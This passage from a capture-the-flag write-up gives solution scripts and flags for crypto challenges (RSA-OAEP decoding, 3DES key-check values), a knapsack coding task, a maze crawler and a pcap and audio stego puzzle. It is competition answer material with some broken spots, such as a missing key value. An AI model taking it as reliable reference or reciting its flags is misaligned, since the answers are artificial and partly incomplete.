       mgs_seed - the seed, a byte string
       mask_len - the length of the mask to generate
       hash_class - the digest algorithm to use, default is SHA1

       Return value: a pseudo-random mask, as a byte string
       '''
    h_len = hash_class().digest_size
    if mask_len > 0x10000:
        raise ValueError('mask too long')
    T = b''
    for i in xrange(0, integer_ceil(mask_len, h_len)):
        C = i2osp(i, 4)
        T = T + hash_class(mgf_seed + C).digest()
    return T[:mask_len]

def decrypt(label=b'', hash_class=hashlib.sha1,
        mgf=mgf1):
    '''Decrypt a byte message using a RSA private key and the OAEP wrapping algorithm,

       Parameters:
       public_key - an RSA public key
       message - a byte string
       label - a label a per-se PKCS#1 standard
       hash_class - a Python class for a message digest algorithme respecting
         the hashlib interface
       mgf1 - a mask generation function

       Return value:
       the string before encryption (decrypted)
    '''
 
    hash = hash_class()
    h_len = hash.digest_size
    k = 256
    em = '\x00T\xf8\xb5a\xceT\x8a\xe0\xad\x93vO/7\xfa\xd2\xb1\xb3H\xf9R\xc2\xbf\x85_\x80\xb9\x86\xda!\x19\xd4~\x14y\xbaO\x93\xb9\xbd<\x85\x8e\xf2\xd4\xe5\xbb\t\x9daD\xea\xfb\xd3u\xa6\xd3m\x00\xbd\xbeyE\x1f+\xc0\x02/r\x00!\x02\xcb\xb5\xbf\xb0\xb1\xbaVK\x8e\x17\x17$\x07x\xc0\xe8v\x9e )\xd0 a\xbd\xf7\xda\xbf\xf8\x97\xc30;k\xf8\x10\x91\x8f\x9aC\x8e,\xf2H\x9c\xa4HU\xcc\x8b\xd6\x86\x98\xe1\x89\x16`.\xe1\x18\xff\xb5\x9b\x95 H\x05\xdb\x81\xfaq+\x93\x90edRV\x13x\xd4\xcbS\xd6q\x8e\xc5\xcfoht\xce9\xf8\x14\xe2\xb0\xf5 \x00\x86! Q\xa4O\xa3\xf9\x96L\xb7\xd7\x0f\xa6\xa8\xd1\xecKy#%U.\x9e\xc9\x99a\xc6\xa7!\x1e\xb0\xeb\xc5\x10\x12[\xc3\x00k\xc9eQi\xbbt@8@\xf8\xd3\x8a\xb9\x84\xba\x8bk\xe31\xc2\xc8]&\xde\x03\x1d\xdd>\xed\xd6\xc1\xfcl|\xd9\x00\x02\xb2\xdf\xf4=\x975\x99'
    # 4. EME-OAEP decoding
    hash.update(label)
    label_hash = hash.digest()
    y, masked_seed, masked_db = em[0], em[1:h_len+1], em[1+h_len:]
    if y != b'\x00' and y != 0:
        raise ValueError('decryption error')
    seed_mask = mgf(masked_db, h_len)
    seed = xor(masked_seed, seed_mask)
    db_mask = mgf(seed, k - h_len - 1)
    db = xor(masked_db, db_mask)
    label_hash_prime, rest = db[:h_len], db[h_len:]
    i = rest.find(b'\x01')
    if i == -1:
        raise exceptions.DecryptionError
    if rest[:i].strip(b'\x00') != b'':
        print(rest[:i].strip(b'\x00'))
        raise exceptions.DecryptionError
    m = rest[i+1:]
    if label_hash_prime != label_hash:
        raise exceptions.DecryptionError
    return m
print decrypt()

```
> output
```bash
$ python rsaes_oaep.py 
The password is {FLG:Us3fUlB@ckUp}. Do not tell anyone! 
```

#### CRYPTO 500
The task descriptions is 
```plain
Name: MISS Z IS THE QUEEN 
In another folder on the restored back-up, called "to be analysed" there’s a leaked email with an encrypted attachment.

R-Boy decides to investigate further.

Can you help him?
```
Given a zip file, unzip the file, there are two files, one is readme,the other is a .eml file which contains a base64 strings. after base64 decode the very long strings, we can see that the base64 decode strings is a zip file, and the end of the zip file attached a PDF file.
```bash
$ tree  
.
├── c3dbd7c3b92757440f58947546945298.eml
├── crypto5.pdf
├── enc_message.txt
├── README.txt
└── zcmk_member.txt

0 directories, 5 files
$ cat README.txt 
The Secret Service have intercepted an e-mail sent by an anonymous spy to Command, head of Secret government agency called B613. 
Hacker, find the secret message and save the White House!                
$ cat zcmk_member.txt 
PART1: 5CD00A357AB2F472CDDEF15A98C91823
PART2: 6605B51DE869FE6CD69165D13F4A8207
PART3: 1304FCA28268E7F08A88314F80B6295C
$ cat enc_message.txt 
uOeYzKAhV5/4rOc4kIAqfuqTSNDmrq+/AdxBIjUMMf6LVe3yxl0OoA==
```
The PDF file content:
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_1e8a4d4c5ee177f7b3ee5855320e5928.png)
Googling ZCMK three part key 3DES KVC, we know is about key distribute and encryption the 3DES key with the master key using 3DES ECB algorithm.The enc_message.txt in encrypted with 3DES key then base64 encode.**KVC** is used to identify the 3DES key.using the following script KCV.py:
```python
import binascii
import hashlib
import base64
from pyDes import *

data = '0'*64
key =  '29d1438a10b3edee91c7a5c42735b378'

key = binascii.unhexlify(key)
data= binascii.unhexlify(data)

print('key: ' + str(key))

k = triple_des(key, ECB, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
d = k.encrypt(data)

print('KCV: ' + str(binascii.hexlify(d))[:6])
```
> output is: KCV: 3f5dc3

```plain
First get the master key and identify it:
PART1= "5CD00A357AB2F472CDDEF15A98C91823"
PART2= "6605B51DE869FE6CD69165D13F4A8207"
PART3= "1304FCA28268E7F08A88314F80B6295C"
masterkey = PART1^PART2^PART3
masterkey = 29d1438a10b3edee91c7a5c42735b378
the output of KCV.py is 3f5dc3 satifies the PDF file 3f 5d c3.
Second get the 3DES key by decrypting the ciphertext.
http://tripledes.online-domain-tools.com/
```
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_8325122826b0e314d44bea2e90da3842.png)
```plain
the 3deskey = ![Uploading file..._4am26nb6v]()

identify the key. output of KCV.py is  3a2179 matches the true 3DES key KCV.
Finally let us catch the flag!!!
In [95]: b64decode("uOeYzKAhV5/4rOc4kIAqfuqTSNDmrq+/AdxBIjUMMf6LVe3yxl0OoA==")
Out[95]: '\xb8\xe7\x98\xcc\xa0!W\x9f\xf8\xac\xe78\x90\x80*~\xea\x93H\xd0\xe6\xae\xaf\xbf\x01\xdcA"5\x0c1\xfe\x8bU\xed\xf2\xc6]\x0e\xa0'
ciphertext = b8e798cca021579ff8ace73890802a7eea9348d0e6aeafbf01dc4122350c31fe8b55edf2c65d0ea0
```
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_7a2c9d8bd66b42afc3fa9672b717b80f.png)
> DONE!


## CODING

#### Coding 200
* TODO: 土味英语，需要润色

This challenge is a simple algorithm question about dynamic programming.
The task we need to do is to choose some challenges to solve which can achieve the best score in 24 hours (1440 minutes). We can see the challenges as the items in a knapsack. The score of the challenge is the value of the item and the ETA is the weight. Only 1440 weights items can put into the knapsack. This is one of the most classic dynamic programming problem —— 0-1 Knapsack Problem. But we  don't need the best score, we need the item we choose. 
I wrote a python script to finish the process of dynamic programming. And it will print the IDs of the challenges to choose, sorted by ETA descending which is the password of `CTF_PRIZE.7z`.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def bag(data):
    dp = list([0 for i in range(24 * 60 + 1)])
    path = list([[0 for j in range(24 * 60 + 1)] for i in range(len(data))])
    for i in range(len(data) - 1, -1, -1):
        for j in range(24 * 60, data[i][-1] - 1, -1):
            if dp[j] < dp[j - data[i][-1]] + data[i][-2]:
                dp[j] = dp[j - data[i][-1]] + data[i][-2]
                path[i][j] = 1
    ans = ''
    i = 0
    j = 24 * 60
    while i < len(data) and j > 0:
        if path[i][j]:
            ans += data[i][0]
            j -= data[i][-1]
        i += 1
    print('socre:%d' % dp[-1])
    return ans


if __name__ == '__main__':
    f = open('Challenges.csv', 'r')
    data = list(map(lambda x: x.strip().split(), f.readlines()))
    data.pop(0)
    eta = {}
    for x in data:
        x[-2] = int(x[-2])
        x[-1] = int(x[-1])
        eta[x[0]] = x[-1]
        if x[1] == 'binary':
            x[-1] *= 2
        elif x[1] == 'web':
            x[-1] //= 2
    ans = bag(data)
    print(ans)
    ans = ''.join(sorted(list(ans), key=lambda x: eta[x], reverse=True))
    print(ans)

```

#### Coding 400
* TODO: 土味英语，需要润色

This challenge is more like a Misc challenge, it requires we have some programming skills, especially writting web spider.
The author provide two door-key pair, by clicking the url we can find that there are more doors and keys in the starting door. Like a maze right? We need to explore the whole maze.
I wrote a multi-thread python script to open all doors.
Once the script found `FLG` in the response content of the server, it will log the content to `flag.txt` and exit.
```python
import requests
import queue
import threading
from bs4 import BeautifulSoup

WORKER_NUMBER = 16
jobs = queue.Queue()
flag = ""

cache = dict()

def parse(content):
    if "FLG" in str(content):
        FLAG = content
        with open("flag.txt", "a+") as f:
            f.write(str(content))
        exit(0)
    result = []
    soup = BeautifulSoup(content, "html.parser")
    tbody = soup.tbody
    for tr in tbody.find_all("tr"):
        tds = tr.find_all("td")
        door = str(tds[0]).replace("<td>", "").replace("</td>", "")
        key = str(tds[1]).replace("<td>", "").replace("</td>", "")
        data = (door, key)
        result.append(data)
    return result

def check(door, key):
    params = {
        "door":door,
        "key":key,
    }
    url = "http://challengebox2.reply.it:1337/webcrawler/open"
    response = requests.get(url, params=params, cookies={
        "JSESSIONID":"D059E78F58A81297FECDFD853BDA5851",
    })
    for i in parse(response.content):
        if i in cache.items():
            print("Item dumplicated! %s" % str(i))
        else:
            cache[i[0]] = i[1]
            jobs.put(i)

data = [
    ("4f704b99-48c3-401a-8dbc-4cfea131ca1b", "aa0edbdc-2053-49de-823f-9bfc54536fec"),
    ("e359505d-045e-4bf5-b9bb-31105dac2a08", "be8437bd-3313-4b0c-b621-6902c487912f"),
]

for i in data:
    jobs.put(i)

def worker(wid):
    while True:
        job = jobs.get()
        print("[%d] %s" % (wid, job))
        check(job[0], job[1])

def start_workers():
    for i in range(WORKER_NUMBER):
        t = threading.Thread(target=worker, args=(i,))
        t.daemon = True
        t.start()

start_workers()


while True:
    command = input("> ")
    if command == "list":
        print(cache)
    elif command == "flag":
        print(flag)
    elif command == "exit":
        break
```
Done.

## MISC
#### MISC 100
The tasks provides a pcap file named `traffic.pcap`, after analysis the pcap, i found the following message.
```plain
GET / HTTP/1.1
Host: 192.168.101.222:1337
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; ONE E1003 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.3
Date: Mon, 17 Sep 2018 12:53:54 GMT
Content-type: text/html; charset=UTF-8
Content-Length: 322

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /</title>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
<li><a href="developers.jpeg">developers.jpeg</a>
<li><a href="listencarefully.mp3">listencarefully.mp3</a>
<li><a href="yeah.png">yeah.png</a>
</ul>
<hr>
</body>
</html>
```
Then using Wireshark to export the HTTP object, we can get a mp3 file named `listencarefully.mp3`. I think it is a mp3 stego. Open the mps with `Audacity` and in spectrogram channel we found the flag:
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_00d7d8e2c72f8e962a62406d22612513.png)



